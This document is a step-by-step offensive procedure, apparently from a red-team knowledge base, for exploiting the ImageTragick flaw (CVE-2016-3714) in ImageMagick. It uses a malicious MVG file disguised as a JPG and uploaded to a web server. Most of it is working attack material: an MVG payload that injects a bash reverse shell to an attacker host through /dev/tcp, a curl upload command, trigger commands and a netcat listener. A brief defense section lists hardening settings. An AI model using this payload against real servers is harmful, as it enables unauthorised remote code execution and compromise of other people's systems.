---
id: 8c2456f7-1663-4a16-9988-e17a93d2da41
name: ImageMagick-RCE-via-Malicious-MVG-Upload
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/CVE-2016-3714]]'
  - '[[tags/RCE]]'
  - '[[tags/File-Upload-Exploits]]'
  - '[[tags/ImageMagick]]'
commands:
  - '[[commands/imagemagick-convert-jpg-to-mvg]]'
  - '[[commands/imagemagick-identify-verbose]]'
platforms:
  - Linux
tools: []
validated: true
---

# ImageMagick-RCE-via-Malicious-MVG-Upload

## Summary

This procedure exploits the ImageTragick vulnerability (CVE-2016-3714) in ImageMagick by uploading a malicious MVG (Magick Vector Graphics) file to a server with an insecure file upload feature. When the server processes the file using vulnerable ImageMagick versions (pre-6.9.4-5 or misconfigured policy.xml), it executes arbitrary commands, enabling remote code execution (RCE) such as spawning a reverse shell.

## Description

ImageMagick is a popular open-source software suite for image processing, often integrated into web applications for handling user-uploaded images. The ImageTragick vulnerability allows attackers to embed malicious commands in MVG files within the 'push graphic-context' directive, tricking the software into fetching external resources or executing system commands via URL schemes like 'url()'. This procedure assumes a web application allows file uploads without proper validation and uses ImageMagick to resize, convert, or identify uploaded images. By crafting an MVG file disguised as an image (e.g., .jpg extension), the attacker uploads it, and server-side processing triggers RCE. Success grants shell access to the server, potentially leading to data exfiltration or persistence. This targets Linux-based servers with vulnerable ImageMagick configurations.

## Requirements

1. Network access to a web application with an insecure file upload endpoint that processes images using ImageMagick.
2. Knowledge of the upload directory or endpoint (e.g., via reconnaissance or source code review).
3. Vulnerable ImageMagick installation (versions before 6.9.4-5 or 7.0.1-8 without restrictive policy.xml).
4. Attacker-controlled server for receiving reverse shell connections (e.g., netcat listener).
5. Tools for file creation and upload (e.g., curl or browser).

## Defense

- Update ImageMagick to the latest version and configure /etc/ImageMagick/policy.xml to disable MVG format and URL fetches (e.g., set <policy domain="coder" rights="none" pattern="MVG" /> and <policy domain="path" rights="none" pattern="@*" />).
- Validate and sanitize uploaded files: restrict extensions, scan for malicious content, and process images in isolated environments (e.g., containers).
- Implement web application firewall (WAF) rules to block suspicious uploads containing 'push', 'url', or shell commands.
- Monitor server logs for ImageMagick executions and anomalous network connections from image processing.

## Objectives

1. Craft and upload a malicious MVG payload disguised as a legitimate image file.
2. Trigger server-side processing of the uploaded file to execute arbitrary commands.
3. Establish a reverse shell or execute commands for system compromise.

## Instructions

### Step 1: Craft the Malicious MVG Payload

**Context**: Create the exploit file using the MVG payload that embeds a reverse shell command. Save it with an image extension (e.g., exploit.jpg) to bypass upload filters. Replace placeholders with your attacker IP and port.

**Code** ([[codes/ImageMagick-MVG-RCE-Reverse-Shell]]):

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

> This MVG snippet uses the 'fill' directive to execute a bash reverse shell via a malformed URL. The double quotes and pipe allow command injection when ImageMagick parses the file. Test locally if possible to verify syntax.

### Step 2: Upload the Malicious File

**Context**: Use the web application's upload feature to send the crafted file. If the endpoint is known (e.g., /upload.php), use curl for precise control; otherwise, use a browser or Burp Suite.

**Command** ([[commands/curl-upload-file]]):
```bash
curl -X POST -F "file=@exploit.jpg" http://target.com/upload
```

> This uploads the file to the server. Expected output: Success message like "File uploaded successfully" or a redirect to the processed image. If the server auto-processes on upload, RCE may trigger immediately.

### Step 3: Trigger Processing and Execute Payload

**Context**: If the server doesn't process automatically, interact with the uploaded image to force ImageMagick execution (e.g., view or convert). This step assumes the attacker can influence processing; in real scenarios, it happens server-side post-upload.

**Command** ([[commands/imagemagick-convert-jpg-to-mvg]]):
```bash
convert legitimate.jpg uploaded_exploit.mvg
```

> Run this on a test vulnerable system to simulate. Expected output: Processed file, but in exploit, it triggers the URL fetch and command execution instead.

**Command** ([[commands/imagemagick-identify-verbose]]):
```bash
identify -verbose uploaded_exploit.mvg
```

> This command parses the MVG file verbosely, executing the embedded payload. Expected output: Image metadata, but success is indicated by the reverse shell connecting to your listener (e.g., nc -lvnp 4444).

### Step 4: Verify RCE

**Context**: Set up a listener on your attacker machine before upload. Monitor for incoming connections or file creation (e.g., 'hello' file as a canary).

**Instructions**: Start netcat: `nc -lvnp $ATTACKER_PORT`. After triggering, check for shell access. If successful, the payload executes bash interactively, piping input/output to your IP/port.

> Expected: Reverse shell prompt. If no connection, check policy.xml restrictions or version.
